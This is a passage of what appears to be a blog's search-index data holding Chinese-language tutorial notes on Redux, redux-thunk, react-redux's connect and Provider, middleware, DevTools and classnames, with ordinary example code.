&#x2F;&#x2F;返回一个新的Object作为Component的Props return obj&#125; 返回的Object中的key(例如上文中的count)是可以在Component里通过 this.props.count 来调用的 而mapDispatchToProp常规的写法应该是返回一个Object，这个Object与 mapStateToProps 的返回值不同的是 它的value并不是一个固定值，而是一个返回值为dispath()方法的回调函数 12345678const mapDispatchToProps &#x3D; (dispatch, ownProps) &#x3D;&gt; &#123; let actionObject1 &#x3D; actions.increase(...args); let actionObject2 &#x3D; actions.decrease(...args); return &#123; increase: ()&#x3D;&gt;(dispatch(actionObject1)), decrease: ()&#x3D;&gt;(dispatch(actionObject2)) &#125; mapDispatchToProps简要的写法按照分析，mapDispatchToProps的返回值里的Value字段应该是由dispatch的结果 但是好多示例代码中并没有用到dispatch这个变量，而是直接把Action作为Object的Value进行返回 例如 123import &#123;switchRightBar&#125; from &quot;..&#x2F;..&#x2F;actions&#x2F;RightBar&quot;;export connect(()&#x3D;&gt;(&#123;&#125;), &#123;switchRightBar&#125;)(UserBox); 原因是官方文档中的 12[mapStateToProps(state, [ownProps]): stateProps] (Function)[mapDispatchToProps(dispatch, [ownProps]): dispatchProps] (Object or Function) mapStateToProps 只能是Function，而mapDispatchToProps既可以是Function，也可以是Object Function: 一组回调函数，函数返回值为dispatch方法，既是常规写法 Object: 直接传入一个由Action组成的Object，既是简便写法 所以说如果connect第一参数要传空，要使用 ()=&gt;({}) MD。。。我讨厌JS。。。。写法规范这么复杂","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"},{"name":"Redux","slug":"Redux","permalink":"http://yoursite.com/tags/Redux/"}]},{"title":"Redux(七):Redux-Thunk进行异步Dispatch","date":"2016-12-05T05:00:00.000Z","path":"2016/12/05/Redux七Redux-Thunk进行异步Dispatch/","text":"Redux-Thunk 中间件Redux-Thunk中间件主要是用来进行异步触发dispatch，比如我们常见的Ajax需要在网络请求返回后进行dispatch 示例代码中我们使用了Fetch这个Ajax工具 12345678910111213&#x2F;&#x2F;Actionexport const getBugsWithPage &#x3D; () &#x3D;&gt; &#123; let actionObject &#x3D; &#123; type: type, bugs: jsonData &#125; &#x2F;&#x2F;异步Ajax请求 fetch(url, &#123;method: &quot;GET&quot;&#125;) .then((res) &#x3D;&gt; &#123; return actionObject &lt;&#x3D;&#x3D;这里return是错误的，因为是在回调函数内部 &#125;)&#125;; 可以看到，如果我们想在ajax返回的回调函数里进行return，是没办法对Action进行Retrun的，如果写在外部，又会在Ajax还未执行完毕被顺序执行 Action Creator所以我们需要引入Redux的Action Creator的概念，既是返回值为Action的函数，例如使用前dispatch内部为一个包含有type的Action 对象 1234567891011&#x2F;* 使用前 *&#x2F;dispatch(&#123; type: ‘change_name’, name: ‘Peter’,&#125;);dispatch(&#123; type: ‘change_name’, name: ‘Ryan’,&#125;); 如果我们写一个changeName函数用来生成对象，那么changeName就是Action Creator 12345678910const changeName &#x3D; (name)&#x3D;&gt;(&#123; type: ‘change_name’, name: name&#125;)&#x2F;* 使用后 *&#x2F;dispatch(changeName(‘Peter’));dispatch(changeName(‘Ryan’)); Thunk 的原理参见Redux-Thunk官方文档 12345678&#x2F;&#x2F; 1+2 会在代码执行时马上被运算&#x2F;&#x2F; x &#x3D;&#x3D;&#x3D; 3let x &#x3D; 1 + 2;&#x2F;&#x2F; 1+2被延迟运算&#x2F;&#x2F; 因为我们把计算1+2作为一个方法的返回值，而foo指向这个方法，只有foo被以方法执行时才会计算1+2&#x2F;&#x2F; foo 就可以为被称为 thunk!let foo &#x3D; () &#x3D;&gt; 1 + 2; Thunk ActionRedux官网说，action就是Plain JavaScript Object。Thunk允许action creator返回一个函数 所以说Thunk就是通过中间件改造了Redux的Action Creator，进行延迟发送Dispatch，这个Creator其可以将dispatch和Store的getState作为参数引入，从而达到异步调用 1234567891011121314151617181920212223&#x2F;&#x2F;Actionconst getBugsWithPage &#x3D; (jsonData) &#x3D;&gt; ( &#123; type: type, bugs: jsonData &#125;);&#x2F;&#x2F;Thunk Actionexport const fetchBugs &#x3D; () &#x3D;&gt; &#123; return (dispatch, getState) &#x3D;&gt; &#123; &#x2F;&#x2F;异步Ajax请求 fetch(url, &#123;method: &quot;GET&quot;&#125;) .then((res) &#x3D;&gt; &#123; &#x2F;&#x2F;从返回的Promise里得到json return res.json() &#125;) .then((json) &#x3D;&gt; &#123; &#x2F;&#x2F;从Json里拿到数据再去Dispatch Action dispatch(getBugsWithPage(json)) &#125;) &#125;&#125;; Action和 Thunk Action的区别Action和 Action Creator的区别主要是返回值不同，以及能否接触到Store的dispatch方法 | 方法 | 返回值 | 参数 || :————- | :————- || Action | 一个包含有type的Object | 和dispatch是独立的，无法互相接触 || Thunk Action| 返回值为一个入参为dispatch的函数 | 可以通过返回的函数异步进行dispatch，并且可以在action中获取到Store里的state | 也就是说Action Creator返回值是 函数 而不是Object 12345&#x2F;&#x2F;Action Creatorexport const fetchBugs &#x3D; () &#x3D;&gt; &#123; &#x2F;&#x2F;返回一个方法 return (dispatch) &#x3D;&gt; &#123; ...可以在任意位置调用dispatch... &#125;&#125;; 配置Redux-Thunk使用Redux-Thunk需要在中间件中配置 123456789101112131415import thunk from &quot;redux-thunk&quot;; &#x2F;&#x2F; redux-thunk 支持 dispatch function，并且可以异步调用它import createLogger from &quot;redux-logger&quot;;import &#123;createStore, applyMiddleware, compose&#125; from &quot;redux&quot;;&#x2F;&#x2F;调用日志打印方法const loggerMiddleware &#x3D; createLogger();&#x2F;&#x2F;创建一个中间件集合，注意thunk最好配置在第一个，因为中间件是顺序敏感的const middleware &#x3D; [thunk, loggerMiddleware];const finalCreateStore &#x3D; compose( applyMiddleware(...middleware) )(createStore);export default finalCreateStore","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"},{"name":"Redux","slug":"Redux","permalink":"http://yoursite.com/tags/Redux/"}]},{"title":"Redux(六):React-Redux的示例Demo代码","date":"2016-12-05T04:00:00.000Z","path":"2016/12/05/Redux六ReactRedux的示例Demo代码/","text":"Demo代码根据文章1-5，我们总结下来，如果想正常使用Redux，需要在工程里配置以下文件 12345678910111213----app ----actions ----RightBar.jsx &lt;&#x3D;&#x3D;RightBar的Actions ----index.jsx &lt;&#x3D;&#x3D;方便对Actions统一导出 ----reducers ----RightBar.jsx &lt;&#x3D;&#x3D;RightBar的Reducer ----index.jsx &lt;&#x3D;&#x3D;方便对Reducer统一导出 ----redux ----configDevTools.jsx &lt;&#x3D;&#x3D;配置DevTools进行调试 ----configReducer.jsx &lt;&#x3D;&#x3D;配置Reducer，进行combineReducers工作 ----configStore.jsx &lt;&#x3D;&#x3D;配置Store，加入中间件和DevTools ----components 配置文件在配置文件里我们用到了文章使用目录路径import进行统一导入 configDevTools.jsx123456789101112&#x2F;&#x2F;调试工具import &#123;createDevTools&#125; from &quot;redux-devtools&quot;;import LogMonitor from &quot;redux-devtools-log-monitor&quot;;import DockMonitor from &quot;redux-devtools-dock-monitor&quot;;const DevTools &#x3D; createDevTools( &lt;DockMonitor toggleVisibilityKey&#x3D;&quot;ctrl-h&quot; changePositionKey&#x3D;&quot;ctrl-q&quot; defaultIsVisible&#x3D;&#123;false&#125;&gt; &lt;LogMonitor theme&#x3D;&quot;tomorrow&quot; preserveScrollTop&#x3D;&#123;false&#125;&#x2F;&gt; &lt;&#x2F;DockMonitor&gt;);export default DevTools configReducer123456&#x2F;&#x2F;利用combineReducers 合并reducersimport &#123;combineReducers&#125; from &quot;redux&quot;;&#x2F;&#x2F;通过reducers目录下的index统一导入import * as Reducers from &quot;..&#x2F;reducers&quot;;export default combineReducers(Reducers) configStore1234567891011121314151617import createLogger from &quot;redux-logger&quot;;import &#123;createStore, applyMiddleware, compose&#125; from &quot;redux&quot;;import DevTools from &quot;.&#x2F;configDevTools&quot;; &#x2F;&#x2F;引入DevTools调试组件&#x2F;&#x2F;调用日志打印方法const loggerMiddleware &#x3D; createLogger();&#x2F;&#x2F;创建一个中间件集合const middleware &#x3D; [loggerMiddleware];&#x2F;&#x2F;利用compose增强store，这个 store 与 applyMiddleware 和 redux-devtools 一起使用const finalCreateStore &#x3D; compose( applyMiddleware(...middleware), DevTools.instrument(),)(createStore);export default finalCreateStore","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"},{"name":"Redux","slug":"Redux","permalink":"http://yoursite.com/tags/Redux/"}]},{"title":"Redux(五):Redux加入中间件、DevTools和Compose","date":"2016-12-05T03:00:00.000Z","path":"2016/12/05/Redux五Redux加入中间件和DevToolsCompose/","text":"Redux的中间件打印日志和监控台Redux除了自身的功能之外，还提供中间件接口，可以通过开发中间件完成一定功能，比如打印日志 注意创建中间件集合的时候middleware，如果有多个中间件，是有顺序敏感的，同一个中间件的index不一样效果也不一样 1234567891011121314151617181920&#x2F;&#x2F; 利用redux-logger打印日志import createLogger from &quot;redux-logger&quot;;&#x2F;&#x2F; 引入redux createStore、中间件及composeimport &#123;createStore, applyMiddleware, compose&#125; from &quot;redux&quot;;&#x2F;&#x2F; 引入DevTools调试组件import DevTools from &quot;.&#x2F;configDevTools&quot;;&#x2F;&#x2F; 调用日志打印方法const loggerMiddleware &#x3D; createLogger();&#x2F;&#x2F;创建一个中间件集合const middleware &#x3D; [loggerMiddleware];&#x2F;&#x2F; 利用compose增强store，这个 store 与 applyMiddleware 和 redux-devtools 一起使用const finalCreateStore &#x3D; compose( applyMiddleware(...middleware), DevTools.instrument(),)(createStore);export default finalCreateStore 然后使用我们增强后的CreateStore来创建Store就可以获得中间件的功能 123import finalCreateStore from &quot;.&#x2F;redux&#x2F;configStore&quot;; &#x2F;&#x2F;进入Store配置const store &#x3D; finalCreateStore(reducer); 调试工具DevToolsDevTools是Redux官方推荐的一个调试工具，用于追踪State的状态等等，可以通过配置文件将其配制成一个Component加入到React中 123456789101112131415&#x2F;&#x2F; 调试工具import React from &quot;react&quot;;import &#123;createDevTools&#125; from &quot;redux-devtools&quot;;import LogMonitor from &quot;redux-devtools-log-monitor&quot;;import DockMonitor from &quot;redux-devtools-dock-monitor&quot;;&#x2F;&#x2F;创建React的Componentconst DevTools &#x3D; createDevTools( &lt;DockMonitor toggleVisibilityKey&#x3D;&quot;ctrl-h&quot; changePositionKey&#x3D;&quot;ctrl-q&quot; defaultIsVisible&#x3D;&#123;false&#125;&gt; &lt;LogMonitor theme&#x3D;&quot;tomorrow&quot; preserveScrollTop&#x3D;&#123;false&#125;&#x2F;&gt; &lt;&#x2F;DockMonitor&gt;);&#x2F;&#x2F;导出为Component可以加入到React中export default DevTools","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"},{"name":"Redux","slug":"Redux","permalink":"http://yoursite.com/tags/Redux/"}]},{"title":"Redux(四):combineReducers的使用","date":"2016-12-05T02:00:00.000Z","path":"2016/12/05/Redux四combineReducers的使/","text":"combineReducers在使用Redux的时候，其中Reducer就是个超级大的Switch…Case…这个设计简直太狗屎了。。。为了防止大家写了成千上百个Switch…Case…，Redux给出了combineReducers，让代码更有条理性 分别写不同的Reducer如果我有两个Reducer文件分别是BugReducer和RightBarReducer 123456789101112131415161718192021&#x2F;&#x2F;BugReducer.jsxexport default function reducer(state, action) &#123; switch (action.type) &#123; case FETCH_ALL_BUG: ....... default: return state &#125;&#125;&#x2F;&#x2F;RightBarReducer.jsxexport default function reducer(state, action) &#123; &#x2F;&#x2F; 根据不同的action type进行state的更新 switch (action.type) &#123; case RIGHTBAR_SWITCH: ..... default: return state &#125;&#125; 可以通过combineReducers把他们合并起来，然后去创建Store 1234567import &#123;combineReducers&#125; from &quot;redux&quot;; &#x2F;&#x2F; 利用combineReducers 合并reducersimport BugReducer from &quot;..&#x2F;reducers&#x2F;BugReducer.jsx&quot;;import RightBarReducer from &quot;..&#x2F;reducers&#x2F;RightBarReducer.jsx&quot;let reducer &#x3D; combineReducers(&#123;BugReducer,RightBarReducer&#125;)const store &#x3D; createStore(reducer); 使用自定义名字影响到State的访问其中如果combineReducers使用 1&#123;BugReducer,RightBarReducer&#125; 等同于 1234&#123; &quot;BugReducer&quot;:BugReducer, &quot;RightBarReducer&quot;:RightBarReducer&#125; 所以说也可以在这一步自己自定义名字 1234&#123; &quot;custom1&quot;:BugReducer, &quot;custom2&quot;:RightBarReducer&#125; 如果使用了自定义的名字，那么在mapStateToProp访问Redux的State的时候，也要使用自己自定义的名字才能访问到","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"},{"name":"Redux","slug":"Redux","permalink":"http://yoursite.com/tags/Redux/"}]},{"title":"Redux(三):React-Redux的基本原理","date":"2016-12-05T01:00:00.000Z","path":"2016/12/05/Redux三ReactRedux的基本原理/","text":"使用React-ReduxReact-Redux提供了两个概念 概念 作用 Provider 作为最顶层的Component以便可以传递数据到任一个Component Connect 用于减少代码量，让代码变得好看Grace React-Redux的核心思想以及节省了哪些代码React-Redux的核心思想就是 通过Provider作为所有Component的父节点以便访问所有Component 使用Connect方法把Redux的数据State和逻辑Action都变成当前Component的Props以便调用 那节省了哪些代码呢？ 节省了复杂的通道层来传递Redux的State和Action Provider首先我们要先把 Provider 这个标签作为顶层标签， 因为React的单向数据流，组建间通讯必须找到共同的父亲Component，那么如果Redux想和任意一个Component通信，那么必须把Provider作为所有标签的父亲 12345678910111213141516import &#123;Provider&#125; from &quot;react-redux&quot;; &#x2F;&#x2F;从React-Redux引入的import &#123;createStore&#125; from &quot;redux&quot;; &#x2F;&#x2F;从Redux引入的import reducer from &quot;.&#x2F;redux&#x2F;configReducer&quot;; &#x2F;&#x2F;引入用于初始化的reducer&#x2F;&#x2F;初始化Storeconst store &#x3D; createStore(reducer);&#x2F;&#x2F;把从React-Redux引入的Provider作为顶级父Component，并且传入初始化的storeReactDOM.render( ( &lt;Provider store&#x3D;&#123;store&#125;&gt; ....... &lt;&#x2F;Provider&gt; ), document.body.appendChild(document.createElement(&quot;div&quot;))); Connect在准备好了Provider和Store之后，我们可以使用Connect方法在任意一个层级的Component进行操作,注意Connect方法也是从React-Redux导入的 1234567import &#123;connect&#125; from &quot;react-redux&quot;class MyComp extends Component &#123; &#x2F;&#x2F; content...&#125;const Comp &#x3D; connect(...args)(MyComp); 首先祭出Redux的官方文档对Connect的描述，然后基本知识请去看淘宝的技术文档，我这里只做简单解说 1connect([mapStateToProps], [mapDispatchToProps], [mergeProps], [options]) connect() 接收四个参数，它们分别是 mapStateToProps，mapDispatchToProps，mergeProps和options。其中最主要的是 mapStateToProps 和 mapDispatchToProps ，后两个是生命周期中一些阶段，进阶学习时才需要，请参考官方文档。 名称 参数 译名 mapStateToProps (state, ownProps) 映射Redux的Store中的State数据到当前Component的Props mapDispatchToProps (dispatch, ownProps) 映射某个Action，让Redux的Dispatch方法到当前Component的Props并且调用 mapStateToProps其两个参数分别代表当前状态 state: 当前Redux的Store内的State数据 ownProps: 当前Component的props内容 在进行逻辑操作之后的返回值，会在经过 mergeProps 生命周期后，重新赋值给当前Component的Props 123456&#x2F;&#x2F;把Redux内部的数据State变成Component的Propsconst mapStateToProps &#x3D; (state, ownProps) &#x3D;&gt; &#123; return &#123; count: state.count + ownProps.count &#125;&#125; mapDispatchToProps其两个参数分别代表当前状态 dispatch: 当前Redux的Store.dispatch对象，可以发送消息 ownProps: 当前Component的props内容 在进行逻辑操作之后的返回值，会在经过 mergeProps 生命周期后，重新赋值给当前Component的Props 123456789101112&#x2F;&#x2F;从外部载入Redux要触发的actionimport actions from &quot;..&#x2F;..&#x2F;actions.jsx&quot;&#x2F;&#x2F;把Redux要触发的action放到dispatch里变成Component的Propsconst mapDispatchToProps &#x3D; (dispatch, ownProps) &#x3D;&gt; &#123; let actionObject1 &#x3D; actions.increase(...args); let actionObject2 &#x3D; actions.decrease(...args); return &#123; increase: ()&#x3D;&gt;(dispatch(actionObject1)), decrease: ()&#x3D;&gt;(dispatch(actionObject2)) &#125; React-Redux节省代码示例假如我们要在某个Component里使用Redux的Action 12345678class Comp extends Component&#123; doSomething &#x3D; ()&#x3D;&gt;&#123; this.props.onIncrease() &#125;&#125;export default Comp 使用React-Redux前 12345678910&#x2F;&#x2F;使用前class App extends Component&#123; render()&#123; return &lt;Comp state&#x3D;&#123;this.state&#125; onIncrease&#x3D;&#123;()&#x3D;&gt;store.dispatch(actions.increase())&#125; &lt;&#x3D;&#x3D;通道层 onDecrease&#x3D;&#123;()&#x3D;&gt;store.dispatch(actions.decrease())&#125; &lt;&#x3D;&#x3D;通道层 &#x2F;&gt; &#125;&#125; 使用React-Redux后,首先在Comp文件里加上Connect 12345678910111213141516171819class Comp extends Component&#123; doSomething &#x3D; ()&#x3D;&gt;&#123; this.props.onIncrease() &#125;&#125;const mapStateToProps &#x3D; (state, ownProps) &#x3D;&gt; &#123; return state&#125;const mapDispatchToProps &#x3D; (dispatch, ownProps) &#x3D;&gt; &#123; actionObject &#x3D; actions.increase(); return &#123; increase: dispatch(actionObject), &#125;&#125;export default connect(mapStateToProps, mapDispatchToProps)(Comp) 然后去看App层 1234567&#x2F;&#x2F;使用后class App extends Component&#123; render()&#123; return &lt;Comp &#x2F;&gt; &#125;&#125; 复杂的通道层被省去了。。。显得清爽多了，并且达到了直接和Component通信的效果","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"},{"name":"Redux","slug":"Redux","permalink":"http://yoursite.com/tags/Redux/"}]},{"title":"Redux(二):Redux的基本原理","date":"2016-12-05T00:00:00.000Z","path":"2016/12/05/Redux二Redux的基本原理/","text":"Redux的学习前提首先声明本文章仅仅是 本人对Redux工作模式的理解，本人也没学透彻，大部分想法靠猜，如果错了，不要打我 Redux的官方文档:阅读基本原理 Redux淘宝团队的技术文档:重点在于为什么需要Redux这个东西 Redux腾讯团队的技术文档:理解React-Redux和Redux是不一样的 正如文章Redux产生的原因里提到的 Redux和React-Redux不是同一个东西！！！不是同一个东西！！ Redux是个基于Key Value Observer模式的数据管理工具 React-Redux仅仅是为了让React使用Redux的时候少写几行代码的工具 Redux的Key Value ObserverRedux提供了三个基本方法 功能 作用 Action 发送消息给Reducer Reducer 接受消息，并且执行相应逻辑 Store 保存数据 所谓KVO这种设计模式，说白了就是 一个独立的线程(一般使用单例Singleton)进行死循环 不停的等待接收消息，消息中必须包含一个Key字段 接收到消息后，根据Key字段执行相应的逻辑操作 先看一段更改后的淘宝团队的示例代码 看之前先去看懂ES6的Arrow Function语法 123456789101112131415161718192021222324252627282930313233343536373839&#x2F;&#x2F;发送消息的Actionconst actions &#x3D; &#123; increase: () &#x3D;&gt; &#123; let actionObject &#x3D; &#123;type: &#39;INCREASE&#39;, increaseDelta: 1&#125;; return actionObject; &#125;, decrease: () &#x3D;&gt; &#123; let actionObject &#x3D; &#123;type: &#39;DECREASE&#39;, decreaseDelta: -1&#125;; return actionObject; &#125;&#125;&#x2F;&#x2F;接收消息进行逻辑处理的Reducerconst reducer &#x3D; (preState &#x3D; &#123;count: 0&#125;, actionObject) &#x3D;&gt; &#123; let updateState &#x3D; &#123;count: 0&#125;; switch (action.type)&#123; case &#39;INCREASE&#39;: updateState &#x3D; &#123;count: preState.count + actionObject.increaseDelta&#125;; return updateState; case &#39;DECREASE&#39;: updateState &#x3D; &#123;count: preState.count + actionObject.decreaseDelta&#125;; return updateState; default: return updateState; &#125;&#125;&#x2F;&#x2F;储存数据的storeconst store &#x3D; createStore(reducer);&#x2F;&#x2F;触发消息，相当于Trigger或者Firestore.dispatch(actions.increase()) &#x2F;&#x2F; &#123;count: 1&#125;store.dispatch(actions.increase()) &#x2F;&#x2F; &#123;count: 2&#125;store.dispatch(actions.increase()) &#x2F;&#x2F; &#123;count: 3&#125;&#x2F;&#x2F;查看Statestore.subscribe(() &#x3D;&gt; console.log(store.getState())); 提供消息的Action分析 Action是一个Object Object内有两个变量 increase 和 decrease 两个变量都是方法变量，指向一个无参数，返回值为Object的方法 返回的Object必须包含一个为type的字段，这个字段就是KVO里的key字段 返回值还可以带一些其它字段increaseDelta来传递数据 接收消息的Reducer分析 reducer本身变量，指向一个方法 指向的方法是一个含有两个参数(preState, actionObject),给preState一个默认参数{count:0} preState是当前情况下Store内部的数据，就是旧数据 内部就十分暴力了。。。就是一个Switch….Case….. 方法返回值一个updateState，是通过逻辑计算后更新的数据 由于方法入参还包括action，所以可以使用action带来的新数据increaseDelta进行更新 储存数据的Store分析 储存数据的Store需要使用reducer作为参数以createStore方法进行初始化 reducer本身是个含有两个参数的方法，所以说reducer是一个回调函数 store自身还有一个方法叫做dispatch，可以接收一个Object 接收的Object就是Action方法的返回值actionObject dispatch函数就是一个触发方法，通过调用该函数，进入回调函数reducer进行逻辑处理 store内部储存数据的部分叫做State，可以通过getState方法查看 ！！最最最最重要的！！ 这个state是Store内部的一个变量，和React的Component内部数据State一毛钱的关系都没有 为毛所有教程都没写这个啊。。难道是因为我智商太低。。大家都觉得不用写么？所以说大家一定不要混淆这个概念 React-Redux如何减少代码量直接使用Redux不使用React-Redux根据文章Redux产生的原因中提到，在React的概念中，props是一个Component唯一通向外部的通道，如果我们有两个不同层级的Component，需要通过props进行一层层的传递数据，例如淘宝团队的示例 12345678910111213class App extends Component&#123; componentWillMount()&#123; store.subscribe((state)&#x3D;&gt;this.setState(state)) &#125; render()&#123; return &lt;Comp state&#x3D;&#123;this.state&#125; onIncrease&#x3D;&#123;()&#x3D;&gt;store.dispatch(actions.increase())&#125; &lt;&#x3D;&#x3D;通道层 onDecrease&#x3D;&#123;()&#x3D;&gt;store.dispatch(actions.decrease())&#125; &lt;&#x3D;&#x3D;通道层 &#x2F;&gt; &#125;&#125; 这样写起来太麻烦了，所以需要使用React-Redux，参考文章React-Redux基本原理","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"},{"name":"Redux","slug":"Redux","permalink":"http://yoursite.com/tags/Redux/"}]},{"title":"Redux(一):React的单项数据流和Redux的诞生的原因","date":"2016-12-04T23:00:00.000Z","path":"2016/12/05/Redux一React的单项数据流和Redux的诞生的原因/","text":"React的单项数据流React最引以为傲的特性就是其“优雅的单向数据流”，用数据来控制界面，打破了MVC这种“禁锢”了开发者二三十年的老顽固，所以叫做RE-ACT(重做，重制，重定义)，它是一种新的思想。 单项数据流的问题单向数据流有个麻烦就是—— 不同的Component之间通信 的问题，React的Component有两个概念 props 和 state 说白了就是public和private变量，那么从A组件传递数据到B组件，必然需要通过public概念的 props 这条途径。 父子组件通信如果父子组件进行通信，那么单项数据流是很简单的，只需要在父亲组件里把数据赋值给Child组件即可 12345678910class Father extends React.Component &#123; ...... render() &#123; return ( &lt;Child data&#x3D;&#123;Father.state&#125; &#x2F;&gt; ) &#125;&#125; 子组件之间通信如果两个 同级的子组件 应该怎么通讯呢？那就必须找到他们共同的父控件，才能进行数据交换 1234567891011class Father extends React.Component &#123; exchangeData &#x3D; ()&#x3D;&gt;&#123;&#125; render() &#123; return ( &lt;Child1 data&#x3D;&#123;Father.exchangeData&#125; &#x2F;&gt; &lt;Child2 data&#x3D;&#123;Father.exchangeData&#125; &#x2F;&gt; ) &#125;&#125; 这就有个很严重的问题 如果组件A和组件B不在同一级,且共同的父组件嵌套了很多层,岂不是为了传递数据，就要在每一层都写一个props用来作为通道？ 层级关系如下 12345678Father &lt;&#x3D;&#x3D;exchange方法在这里 ----Middle1-1 &lt;&#x3D;&#x3D;exchange方法传递到1-1props-------------(通道层) ----Middle1-2 &lt;&#x3D;&#x3D;1-1的props再传递给1-2的props-----------(通道层) ----Middle1-3 &lt;&#x3D;&#x3D;1-2的props传递给1-3的props-------------(通道层) ----ChildA &lt;&#x3D;&#x3D;从1-3的props里接收exchange数据 ----Middle2-1 &lt;&#x3D;&#x3D;exchange方法传递到2-1的props-----------(通道层) ----Middle2-2 &lt;&#x3D;&#x3D;2-1的props传递给2-2的props-------------(通道层) ----ChildB &lt;&#x3D;&#x3D;从2-2的props里接受exchange数据 这简直太坑爹了，为了两个Component通信我们竟然需要5个通道层 为了解决这个问题Facebook提出了一个Flux方案，来解决组件间通信的问题。 如何解决数据流的问题在Flux的基础上，开源组织作出了Redux来解决这个问题，虽然Redux和React并不是绑定的，也可以应用于Angular等，但是目前在React解决数据通信问题中十分流行。 组件间通讯的方式不同的Object之间进行通讯，一般有两种方式 通信方式 渠道 原理 例子 通知方式 利用中转 需要另外一个线程或Object作为中转站，进行Key Value Observer形式的收发消息 iOS的通知中心 消息方式 点对点发送 通过获取到目标组件的地址，来点对点发送某个消息，调用某个方法 iOS的protocol 听某位大师说还有另外一种通信方式是C++的COM解决方案。。。没有查到详细的 Redux 采用的哪种方式Redux采用的是 通知方式 的组件间通信，分为Action，Reducer，Store 来完成KVO的概念 功能 作用 Action 发送消息给Reducer Reducer 接受消息，并且执行相应逻辑 Store 保存数据 具体使用方法请参考文章Redux，说白了Redux就是一个独立于React的大Object，保存了一些数据，组件间通过去Redux读取逻辑处理后的数据，来进行通信。 Redux如何和React结合上文提到Redux只是一种数据流的控制方法，并不必须和React绑定，所以说会有两个库 库名 作用 Redux 提供Redeux的三个基本方法 React-Redux React中的Reduce，提供Connect和Provide方法 当我们在使用React中使用Redux时，一般来讲是指的使用Redux 加上 React-Redux两者，其中Redux负责控制数据流，而 React-Redux负责嵌入到React中，在遵循React的单向数据流的前提下，减少代码编写量 具体参考文章React-Redux","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"},{"name":"Redux","slug":"Redux","permalink":"http://yoursite.com/tags/Redux/"}]},{"title":"React动态改变class来切换样式","date":"2016-12-03T23:00:00.000Z","path":"2016/12/04/React动态改变class来切换样式/","text":"React动态改变class来切换样式React有个库的名字叫classnames可以用来动态控制JS中class的逻辑，并且可以绑定写好的样式，以配合CSS的Hash 12345678910111213141516171819202122import style from &quot;.&#x2F;RightBar.scss&quot;; &#x2F;&#x2F;加载写好的样式import Classbind from &quot;classnames&#x2F;bind &#x2F;&#x2F;加载Classname的绑定let classNames &#x3D; Classbind.bind(style);&#x2F;&#x2F;对写好的样式进行绑定class RightBar extends React.Component &#123; render() &#123; &#x2F;&#x2F;写好class的集合和控制逻辑 let clazz &#x3D; classNames(&#123; root: true, active: this.props.active &#125;); &#x2F;&#x2F;使用class的集合clazz return ( &lt;div className&#x3D;&#123;clazz&#125;&gt; &#123;this.props.children&#125; &lt;&#x2F;div&gt; ) &#125;&#125; 如果觉得这样太麻烦可以简单点写 12345678910111213141516171819import classnames from &quot;classnames&#x2F;bind&quot;;import style from &quot;.&#x2F;Content.scss&quot;;class Content extends React.Component &#123; render() &#123; &#x2F;&#x2F;直接调用绑定省区临时变量 let clazz &#x3D; classnames.bind(style)(&#123; root: true, extend: this.props.extend, &#125;); &#x2F;&#x2F;载入class的集合clazz return ( &lt;div className&#x3D;&#123;clazz&#125;&gt; &#123;this.props.children&#125; &lt;&#x2F;div&gt; ) &#125;&#125;","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"}]},{"title":"Redux对内部Class进行Connect","date":"2016-12-03T04:00:00.000Z","path":"2016/12/03/Redux对内部Class进行Connect/","text":"Connect需要调用在作用域内与文章ES6文内件多个Clss时WebStorm不能自动补全中提到的作用域错误时无法自动补全但是不会报错不同，在使用Redux的Connect时，如果使用错了作用域会直接报错 12345678910111213141516171819202122232425&#x2F;&#x2F;在Header之前，可以被自动补全class UserBox extends Component &#123;...&#125;&#x2F;&#x2F;在Header之前，可以被自动补全，Connect在UserBox之后，可以有效Connectconst ConnectedUserBox &#x3D; connect(() &#x3D;&gt; (&#123;&#125;), &#123;switchRightBar&#125;)(UserBox);class Header extends Component &#123; render() &#123; return ( &lt;div&gt; &lt;UserBox &#x2F;&gt; &lt;&#x3D;&#x3D;可以自动补全 &lt;ConnectedUserBox &#x2F;&gt; &lt;&#x3D;&#x3D;可以自动补全 &#123;&lt;TitleBox &#x2F;&gt;&#125; &lt;&#x3D;&#x3D;不能正常自动补全，但是不会报错 &#123;&lt;ConnectedTitleBox &#x2F;&gt;&#125; &lt;&#x3D;&#x3D;不能正常自动补全，并且会在运行后会报错 &lt;&#x2F;div&gt; ) &#125;&#125;&#x2F;&#x2F;在Header之后，不可以自动补全，调用Connect调用时TitleBox还没声明，不能正常使用ConnectedTitleBoxconst ConnectedTitleBox &#x3D; connect(() &#x3D;&gt; (&#123;&#125;), &#123;switchSideBar&#125;)(TitleBox);&#x2F;&#x2F;在Header之后，不可以自动补全class TitleBox extends Component &#123;...&#125;","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"},{"name":"Redux","slug":"Redux","permalink":"http://yoursite.com/tags/Redux/"}]},{"title":"动态传入Class创建子Component","date":"2016-12-03T03:00:00.000Z","path":"2016/12/03/动态传入Class创建子Component/","text":"动态传入Class创建子Component需求是不同的Menu标题要有不同的Icon图标 123456789101112131415161718192021222324252627282930313233343536373839404142434445import FaEye from 